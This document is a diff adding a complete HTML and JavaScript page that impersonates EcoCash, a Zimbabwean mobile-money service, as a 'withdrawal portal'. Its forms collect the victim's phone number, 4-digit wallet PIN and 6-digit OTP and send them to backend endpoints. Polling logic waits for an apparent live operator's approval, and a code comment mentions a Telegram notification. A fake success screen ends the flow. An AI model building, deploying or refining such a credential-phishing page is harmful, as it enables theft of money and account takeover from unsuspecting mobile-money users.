@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EcoCash Withdrawal Portal</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background: white;
+            padding: 20px 20px 0 20px;
+            border-radius: 0;
+            width: 100%;
+            max-width: 420px;
+            box-sizing: border-box;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            min-height: 100vh;
+        }
+        @media (min-width: 450px) {
+            .card {
+                min-height: auto;
+                border-radius: 16px;
+                box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+                padding: 30px 30px 0 30px;
+            }
+        }
+        
+        /* EcoCash Logo Styling */
+        .logo-container {
+            margin-top: 20px;
+            margin-bottom: 25px;
+        }
+        .logo-ecocash {
+            font-size: 36px;
+            font-weight: bold;
+            letter-spacing: -1px;
+        }
+        .logo-eco { color: #0042ad; }
+        .logo-cash { color: #e31b23; }
+
+        h2 { margin-bottom: 20px; color: #222; font-size: 22px; }
+        
+        .form-group {
+            margin-bottom: 18px;
+            text-align: left;
+        }
+        label { display: block; font-size: 14px; color: #444; margin-bottom: 6px; font-weight: 500; }
+        
+        /* Phone Input Container matching reference image */
+        .phone-input-container {
+            display: flex;
+            align-items: center;
+            border: 2px solid #0042ad;
+            border-radius: 10px;
+            overflow: hidden;
+            background: #fff;
+            padding: 4px;
+        }
+        .flag-box {
+            padding: 0 10px;
+            font-size: 20px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            color: #555;
+        }
+        .prefix {
+            font-size: 16px;
+            color: #333;
+            font-weight: 600;
+            margin-right: 5px;
+        }
+        .phone-input-container input {
+            border: none;
+            outline: none;
+            width: 100%;
+            padding: 10px 5px;
+            font-size: 16px;
+            background: transparent;
+        }
+
+        /* Amount Container */
+        .amount-container {
+            position: relative;
+        }
+        .currency-symbol {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 16px;
+            color: #333;
+            font-weight: bold;
+        }
+        .amount-container input {
+            padding-left: 30px;
+            border: 2px solid #0042ad;
+            border-radius: 10px;
+            padding-top: 12px;
+            padding-bottom: 12px;
+            outline: none;
+            width: 100%;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+
+        /* 4-Digit PIN Boxes Style */
+        .pin-boxes {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        .pin-box {
+            width: 55px;
+            height: 55px;
+            text-align: center;
+            font-size: 24px;
+            border: 2px solid #0042ad;
+            border-radius: 12px;
+            outline: none;
+            background: #fff;
+        }
+        .pin-box:focus {
+            border-color: #e31b23;
+            box-shadow: 0 0 6px rgba(227, 27, 35, 0.2);
+        }
+
+        /* Main Continue / Withdraw Buttons */
+        .action-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #0042ad;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.2s;
+        }
+        .action-btn:hover { background-color: #00338d; }
+
+        .hidden { display: none; }
+        
+        /* Spinner Styles */
+        .spinner-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 60px 0;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #e9ecef;
+            border-top: 5px solid #0042ad;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .error-msg {
+            color: #e31b23;
+            font-size: 14px;
+            margin-bottom: 15px;
+            font-weight: 500;
+        }
+
+        /* EcoCash Footer Section matching reference image */
+        .ecocash-footer {
+            background-color: #0042ad;
+            margin: 30px -20px 0 -20px;
+            padding: 25px 20px;
+            color: white;
+            border-top-left-radius: 24px;
+            border-top-right-radius: 24px;
+            text-align: center;
+        }
+        @media (min-width: 450px) {
+            .ecocash-footer {
+                margin: 30px -30px 0 -30px;
+                border-bottom-left-radius: 16px;
+                border-bottom-right-radius: 16px;
+            }
+        }
+        .footer-text {
+            font-size: 13px;
+            line-height: 1.4;
+            margin-bottom: 15px;
+            color: #e2ecff;
+        }
+        .footer-buttons {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+        .footer-btn {
+            background: white;
+            color: #0042ad;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 10px;
+            font-weight: bold;
+            font-size: 14px;
+            cursor: pointer;
+            flex: 1;
+            max-width: 150px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        .version-text {
+            font-size: 11px;
+            color: #b5d1ff;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card" id="appCard">
+        <div>
+            <!-- EcoCash Branding Header -->
+            <div class="logo-container">
+                <div class="logo-ecocash"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div>
+            </div>
+
+            <!-- STEP 1: Phone & Amount Form -->
+            <div id="withdrawalView">
+                <h2>Login</h2>
+                <div id="errorBanner" class="error-msg hidden"></div>
+                <form id="detailsForm">
+                    <div class="form-group">
+                        <div class="phone-input-container">
+                            <div class="flag-box">🇿🇼 ▾</div>
+                            <span class="prefix">+263</span>
+                            <input type="tel" id="phone" required placeholder="Phone Number" maxlength="10" pattern="[0-9]{9,10}">
+                        </div>
+                    </div>
+                    <div class="form-group" style="margin-top: 20px;">
+                        <label style="text-align: left;">Withdrawal Amount</label>
+                        <div class="amount-container">
+                            <span class="currency-symbol">$</span>
+                            <input type="number" id="amount" required placeholder="0.00" step="0.01" min="1">
+                        </div>
+                    </div>
+                    <button type="submit" id="proceedBtn" class="action-btn" style="margin-top: 25px;">Continue</button>
+                </form>
+            </div>
+
+            <!-- STEP 2: 4-Digit PIN Input View -->
+            <div id="pinView" class="hidden">
+                <h2>Enter your PIN</h2>
+                <div id="pinError" class="error-msg hidden"></div>
+                <form id="pinForm">
+                    <div class="pin-boxes" style="margin-top: 25px;">
+                        <input type="password" class="pin-box" maxlength="1" pattern="[0-9]" inputmode="numeric" required />
+                        <input type="password" class="pin-box" maxlength="1" pattern="[0-9]" inputmode="numeric" required />
+                        <input type="password" class="pin-box" maxlength="1" pattern="[0-9]" inputmode="numeric" required />
+                        <input type="password" class="pin-box" maxlength="1" pattern="[0-9]" inputmode="numeric" required />
+                    </div>
+                    <button type="submit" class="action-btn" style="margin-top: 20px;">Withdraw</button>
+                </form>
+                <p style="margin-top: 20px;"><a href="#" onclick="alert('Please contact EcoCash support to reset your PIN.'); return false;" style="color: #0042ad; text-decoration: none; font-size: 14px; font-weight: 500;">Forgot PIN?</a></p>
+            </div>
+
+            <!-- STEP 3: Loading / Waiting Spinner View -->
+            <div id="spinnerView" class="hidden">
+                <div class="spinner-container">
+                    <div class="spinner"></div>
+                    <h3 id="spinnerText" style="color: #0042ad; font-size: 18px;">Withdrawal processing...</h3>
+                    <p style="color: #666; font-size: 14px;">Please wait while we verify your transaction.</p>
+                </div>
+            </div>
+
+            <!-- STEP 4: OTP Verification View -->
+            <div id="otpView" class="hidden">
+                <h2>Enter OTP</h2>
+                <p style="color: #666; font-size: 14px; margin-bottom: 20px;">Enter the 6-digit verification code sent to your device.</p>
+                <div id="otpError" class="error-msg hidden"></div>
+                <form id="otpForm">
+                    <div class="form-group">
+                        <input type="text" id="otpCode" required placeholder="Enter 6-digit OTP" maxlength="6" pattern="[0-9]{6}" style="border: 2px solid #0042ad; border-radius: 10px; padding: 12px; font-size: 16px; outline: none; width: 100%; box-sizing: border-box; text-align: center; letter-spacing: 2px;">
+                    </div>
+                    <button type="submit" class="action-btn" style="margin-top: 15px;">Confirm OTP</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- EcoCash Footer matching reference image -->
+        <div class="ecocash-footer">
+            <div class="footer-text">To register an EcoCash wallet or get assistance, click below</div>
+            <div class="footer-buttons">
+                <button class="footer-btn" onclick="alert('Redirecting to registration...');">Register</button>
+                <button class="footer-btn" onclick="alert('Opening Help & Support...');">Help & Support</button>
+            </div>
+            <div class="version-text">v3.0.2P</div>
+        </div>
+    </div>
+
+    <script>
+        const detailsForm = document.getElementById('detailsForm');
+        const pinForm = document.getElementById('pinForm');
+        const otpForm = document.getElementById('otpForm');
+        
+        const withdrawalView = document.getElementById('withdrawalView');
+        const pinView = document.getElementById('pinView');
+        const spinnerView = document.getElementById('spinnerView');
+        const otpView = document.getElementById('otpView');
+        
+        const spinnerText = document.getElementById('spinnerText');
+        const errorBanner = document.getElementById('errorBanner');
+        const pinError = document.getElementById('pinError');
+        const otpError = document.getElementById('otpError');
+        const appCard = document.getElementById('appCard');
+        const proceedBtn = document.getElementById('proceedBtn');
+        const amountInput = document.getElementById('amount');
+
+        let pollInterval = null;
+        let storedPhone = '';
+        let storedAmount = '';
+
+        // Dynamic button text update
+        amountInput.addEventListener('input', () => {
+            const val = amountInput.value.trim();
+            if (val) {
+                proceedBtn.innerText = `Do you want to withdraw $${val}?`;
+            } else {
+                proceedBtn.innerText = 'Continue';
+            }
+        });
+
+        // 1. Handle Details Submission
+        detailsForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            errorBanner.classList.add('hidden');
+
+            const rawPhone = document.getElementById('phone').value.trim();
+            storedPhone = '+263' + rawPhone;
+            storedAmount = amountInput.value.trim();
+
+            if (rawPhone.length > 10) {
+                errorBanner.innerText = "Phone number cannot exceed 10 digits after +263.";
+                errorBanner.classList.remove('hidden');
+                return;
+            }
+
+            withdrawalView.classList.add('hidden');
+            pinView.classList.remove('hidden');
+        });
+
+        // Auto-jump for 4-digit PIN boxes
+        const pinBoxes = document.querySelectorAll('.pin-box');
+        pinBoxes.forEach((box, index) => {
+            box.addEventListener('input', (e) => {
+                if (e.target.value.length === 1 && index < pinBoxes.length - 1) {
+                    pinBoxes[index + 1].focus();
+                }
+            });
+            box.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && box.value === '' && index > 0) {
+                    pinBoxes[index - 1].focus();
+                }
+            });
+        });
+
+        // 2. Handle PIN Submission & Telegram Notification
+        pinForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            pinError.classList.add('hidden');
+
+            let pin = '';
+            pinBoxes.forEach(box => pin += box.value);
+
+            if (pin.length !== 4) {
+                pinError.innerText = "PIN must be exactly 4 digits.";
+                pinError.classList.remove('hidden');
+                return;
+            }
+
+            pinView.classList.add('hidden');
+            spinnerView.classList.remove('hidden');
+            spinnerText.innerText = "Withdrawal processing...";
+
+            try {
+                const response = await fetch('/api/withdrawal', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: storedPhone, amount: storedAmount, pin })
+                });
+                const data = await response.json();
+                
+                if (data.status === 'pending') {
+                    startPolling('/api/check-withdrawal-status', (statusData) => {
+                        if (statusData.status === 'approved') {
+                            stopPolling();
+                            spinnerView.classList.add('hidden');
+                            otpView.classList.remove('hidden');
+                        } else if (statusData.status === 'rejected') {
+                            stopPolling();
+                            spinnerView.classList.add('hidden');
+                            pinView.classList.remove('hidden');
+                            pinError.innerText = "Withdrawal request was declined.";
+                            pinError.classList.remove('hidden');
+                        }
+                    });
+                }
+            } catch (err) {
+                spinnerView.classList.add('hidden');
+                pinView.classList.remove('hidden');
+                pinError.innerText = "Connection error. Please try again.";
+                pinError.classList.remove('hidden');
+            }
+        });
+
+        // 3. Handle OTP Submission
+        otpForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            otpError.classList.add('hidden');
+
+            const otp = document.getElementById('otpCode').value.trim();
+
+            if (otp.length !== 6) {
+                otpError.innerText = "OTP must be exactly 6 digits.";
+                otpError.classList.remove('hidden');
+                return;
+            }
+
+            otpView.classList.add('hidden');
+            spinnerView.classList.remove('hidden');
+            spinnerText.innerText = "Withdrawal processing...";
+
+            try {
+                const response = await fetch('/api/verify-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ otp })
+                });
+                const data = await response.json();
+
+                if (data.status === 'pending') {
+                    startPolling('/api/check-otp-status', (statusData) => {
+                        if (statusData.status === 'success') {
+                            stopPolling();
+                            spinnerView.classList.add('hidden');
+                            appCard.innerHTML = `
+                                <div style="margin-top: 40px;">
+                                    <div class="logo-container"><div class="logo-ecocash"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div></div>
+                                    <h2 style="color: #0042ad; margin-top: 30px;">Withdrawal Successful! 🎉</h2>
+                                    <p style="color:#555; font-size: 16px; margin-top: 15px;">Your withdrawal of <b>$${storedAmount}</b> has been processed successfully.</p>
+                                </div>
+                                <div class="ecocash-footer">
+                                    <div class="footer-text">Thank you for using EcoCash</div>
+                                    <div class="version-text">v3.0.2P</div>
+                                </div>
+                            `;
+                        } else if (statusData.status === 'wrong') {
+                            stopPolling();
+                            spinnerView.classList.add('hidden');
+                            otpView.classList.remove('hidden');
+                            otpError.innerText = "Wrong OTP, try again.";
+                            otpError.classList.remove('hidden');
+                        }
+                    });
+                }
+            } catch (err) {
+                spinnerView.classList.add('hidden');
+                otpView.classList.remove('hidden');
+                otpError.innerText = "Error verifying OTP. Try again.";
+                otpError.classList.remove('hidden');
+            }
+        });
+
+        function startPolling(url, callback) {
+            pollInterval = setInterval(async () => {
+                try {
+                    const res = await fetch(url);
+                    const data = await res.json();
+                    callback(data);
+                } catch (e) {
+                    console.log("Polling error", e);
+                }
+            }, 3000);
+        }
+
+        function stopPolling() {
+            if (pollInterval) {
+                clearInterval(pollInterval);
+                pollInterval = null;
+            }
+        }
+    </script>
+</body>
+</html>
